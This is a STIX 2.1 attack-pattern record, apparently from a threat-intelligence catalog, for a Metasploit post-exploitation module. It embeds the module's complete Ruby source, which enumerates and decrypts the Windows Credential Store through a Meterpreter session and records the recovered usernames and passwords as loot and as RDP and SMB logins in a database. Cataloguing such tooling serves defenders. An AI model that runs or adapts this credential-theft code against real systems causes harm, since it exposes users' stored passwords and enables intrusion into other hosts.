{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--606f56ba-99e5-489a-9d04-5afed186ae1f",
    "created": "2024-08-14T16:33:08.241724Z",
    "modified": "2024-08-14T16:33:08.241728Z",
    "name": "Windows Gather Credential Store Enumeration and Decryption Module",
    "description": " This module will enumerate the Microsoft Credential Store and decrypt the credentials. This module can only access credentials created by the user the process is running as.  It cannot decrypt Domain Network Passwords, but will display the username and location.  'License' => MSF_LICENSE 'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/enum_cred_store.rb",
            "external_id": "enum_cred_store.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Credential Store Enumeration and Decryption Module',\n        'Description' => %q{\n          This module will enumerate the Microsoft Credential Store and decrypt the\n          credentials. This module can only access credentials created by the user the\n          process is running as.  It cannot decrypt Domain Network Passwords, but will\n          display the username and location.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => ['Kx499'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_net_resolve_host\n              stdapi_railgun_api\n              stdapi_sys_process_attach\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_memory_allocate\n              stdapi_sys_process_memory_read\n              stdapi_sys_process_memory_write\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  #############################\n  # RAILGUN HELPER FUNCTIONS\n  ############################\n  def is_86\n    if @is_86_check.nil?\n      pid = session.sys.process.open.pid\n      @is_86_check = session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'\n    end\n\n    @is_86_check\n  end\n\n  def pack_add(data)\n    if is_86\n      addr = [data].pack('V')\n    else\n      addr = [data].pack('Q<')\n    end\n    return addr\n  end\n\n  def mem_write(data, length)\n    pid = session.sys.process.open.pid\n    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)\n    mem = process.memory.allocate(length)\n    process.memory.write(mem, data)\n    return mem\n  end\n\n  def read_str(address, len, type)\n    begin\n      pid = session.sys.process.open.pid\n      process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)\n      raw = process.memory.read(address, len)\n      if type == 0 # unicode\n        str_data = raw.gsub(\"\\x00\", '')\n      elsif type == 1 # null terminated\n        str_data = raw.unpack('Z*')[0]\n      elsif type == 2 # raw data\n        str_data = raw\n      end\n    rescue StandardError\n      str_data = nil\n    end\n    return str_data || 'Error Decrypting'\n  end\n\n  def decrypt_blob(daddr, dlen, type)\n    # type 0 = passport cred, type 1 = wininet cred\n    # set up entropy\n    c32 = session.railgun.crypt32\n    guid = '82BD0E67-9FEA-4748-8672-D5EFE5B779B0' if type == 0\n    guid = 'abe2869f-9b47-4cd9-a358-c22904dba7f7' if type == 1\n    ent_sz = 74\n    salt = []\n    guid.each_byte do |c|\n      salt << c * 4\n    end\n    ent = salt.pack('s*')\n\n    # write entropy to memory\n    mem = mem_write(ent, 1024)\n\n    # prep vars and call function\n    addr = pack_add(daddr)\n    len = pack_add(dlen)\n    eaddr = pack_add(mem)\n    elen = pack_add(ent_sz)\n\n    if is_86\n      ret = c32.CryptUnprotectData(\"#{len}#{addr}\", 16, \"#{elen}#{eaddr}\", nil, nil, 0, 8)\n      len, add = ret['pDataOut'].unpack('V2')\n    else\n      ret = c32.CryptUnprotectData(\"#{len}#{addr}\", 16, \"#{elen}#{eaddr}\", nil, nil, 0, 16)\n      len, add = ret['pDataOut'].unpack('Q<2')\n    end\n\n    # get data, and return it\n    return '' unless ret['return']\n\n    return read_str(add, len, 0)\n  end\n\n  def gethost(hostorip)\n    # check for valid ip and return if it is\n    return hostorip if Rex::Socket.dotted_ip?(hostorip)\n\n    ## get IP for host\n    vprint_status(\"Looking up IP for #{hostorip}\")\n    result = client.net.resolve.resolve_host(hostorip)\n    return result[:ip] if result[:ip]\n    return nil if result[:ip].nil? || result[:ip].empty?\n  end\n\n  def report_db(cred)\n    ip_add = nil\n    host = ''\n    port = 0\n    begin\n      if cred['targetname'].include? 'TERMSRV'\n        host = cred['targetname'].gsub('TERMSRV/', '')\n        port = 3389\n        service = 'rdp'\n      elsif cred['type'] == 2\n        host = cred['targetname']\n        port = 445\n        service = 'smb'\n      else\n        return false\n      end\n\n      ip_add = gethost(host)\n\n      if ip_add.nil?\n        return\n      else\n        service_data = {\n          address: ip_add,\n          port: port,\n          protocol: 'tcp',\n          service_name: service,\n          workspace_id: myworkspace_id\n        }\n\n        credential_data = {\n          origin_type: :session,\n          session_id: session_db_id,\n          post_reference_name: refname,\n          username: cred['username'],\n          private_data: cred['password'],\n          private_type: :password\n        }\n\n        credential_core = create_credential(credential_data.merge(service_data))\n\n        login_data = {\n          core: credential_core,\n          access_level: 'User',\n          status: Metasploit::Model::Login::Status::UNTRIED\n        }\n\n        create_credential_login(login_data.merge(service_data))\n        print_status(\"Credentials for #{ip_add} added to db\")\n      end\n    rescue ::Exception => e\n      print_error(\"Error adding credential to database for #{cred['targetname']}\")\n      print_error(e.to_s)\n    end\n  end\n\n  def get_creds\n    credentials = []\n    # call credenumerate to get the ptr needed\n    adv32 = session.railgun.advapi32\n    begin\n      ret = adv32.CredEnumerateA(nil, 0, 4, 4)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error('This module requires WinXP or higher')\n      print_error(\"CredEnumerateA() failed: #{e.class} #{e}\")\n      ret = nil\n    end\n    if ret.nil?\n      count = 0\n      arr_len = 0\n    else\n      p_to_arr = ret['Credentials'].unpack('V')\n      if is_86\n        count = ret['Count']\n        arr_len = count * 4\n      else\n        count = ret['Count'] & 0x00000000ffffffff\n        arr_len = count * 8\n      end\n    end\n\n    # tell user what's going on\n    print_status(\"#{count} credentials found in the Credential Store\")\n    return credentials unless arr_len > 0\n\n    if count > 0\n      print_status('Decrypting each set of credentials, this may take a minute...')\n\n      # read array of addresses as pointers to each structure\n      raw = read_str(p_to_arr[0], arr_len, 2)\n      pcred_array = raw.unpack('V*') if is_86\n      pcred_array = raw.unpack('Q<*') unless is_86\n\n      # loop through the addresses and read each credential structure\n      pcred_array.each do |pcred|\n        cred = {}\n        if is_86\n          raw = read_str(pcred, 52, 2)\n        else\n          raw = read_str(pcred, 80, 2)\n        end\n\n        cred_struct = raw.unpack('VVVVQ<VVVVVVV') if is_86\n        cred_struct = raw.unpack('VVQ<Q<Q<Q<Q<VVQ<Q<Q<') unless is_86\n        cred['flags'] = cred_struct[0]\n        cred['type'] = cred_struct[1]\n        cred['targetname'] = read_str(cred_struct[2], 512, 1)\n        cred['comment'] = read_str(cred_struct[3], 256, 1)\n        cred['lastdt'] = cred_struct[4]\n        cred['persist'] = cred_struct[7]\n        cred['attribcnt'] = cred_struct[8]\n        cred['pattrib'] = cred_struct[9]\n        cred['targetalias'] = read_str(cred_struct[10], 256, 1)\n        cred['username'] = read_str(cred_struct[11], 513, 1)\n\n        if cred['targetname'].include?('TERMSRV')\n          cred['password'] = read_str(cred_struct[6], cred_struct[5], 0)\n        elsif cred['type'] == 1\n          decrypted = decrypt_blob(cred_struct[6], cred_struct[5], 1)\n          cred['username'] = decrypted.split(':')[0] || 'No Data'\n          cred['password'] = decrypted.split(':')[1] || 'No Data'\n        elsif cred['type'] == 4\n          cred['password'] = decrypt_blob(cred_struct[6], cred_struct[5], 0)\n        else\n          cred['password'] = 'unsupported type'\n        end\n\n        # only add to array if there is a target name\n        unless (cred['targetname'] == 'Error Decrypting') || (cred['password'] == 'unsupported type')\n          print_status(\"Credential sucessfully decrypted for: #{cred['targetname']}\")\n          credentials << cred\n        end\n      end\n    else\n      print_status('No Credential are available for decryption')\n    end\n    return credentials\n  end\n\n  def run\n    creds = get_creds\n    # store all data to loot if data returned\n    if !creds.empty?\n      creds.each do |cred|\n        credstr = \"\\t Type: \"\n        credstr << cred['type'].to_s\n        credstr << '  User: '\n        credstr << cred['username']\n        credstr << '  Password: '\n        credstr << cred['password']\n        print_good(cred['targetname'])\n        print_line(credstr)\n        # store specific  creds to db\n        report_db(cred)\n        print_line('')\n      end\n\n      print_status('Writing all data to loot...')\n      path = store_loot(\n        'credstore.user.creds',\n        'text/plain',\n        session,\n        creds,\n        'credstore_user_creds.txt',\n        'Microsoft Credential Store Contents'\n      )\n      print_good(\"Data saved in: #{path}\")\n    end\n  end\nend\n"
}